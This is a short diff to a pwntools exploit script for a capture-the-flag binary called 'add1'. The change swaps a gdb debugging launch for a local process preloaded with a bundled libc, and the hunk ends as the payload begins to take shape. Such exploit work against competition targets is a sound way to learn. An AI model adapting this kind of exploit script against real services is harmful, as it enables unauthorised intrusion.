@@ -1,12 +1,7 @@
 from pwn import *
 
-gdbscript = '''
-c
-'''
-
 # p = remote("chals.damctf.xyz", 30123)
-p = gdb.debug("./add1", gdbscript, env={"LD_PRELOAD" : "./libc.so.6"})
-# p = process("./add1", env={"LD_PRELOAD": "./libc.so.6"})
+p = process("./add1", env={"LD_PRELOAD": "./libc.so.6"})
 
 payload  = b'0'
 payload += b' '*0x18
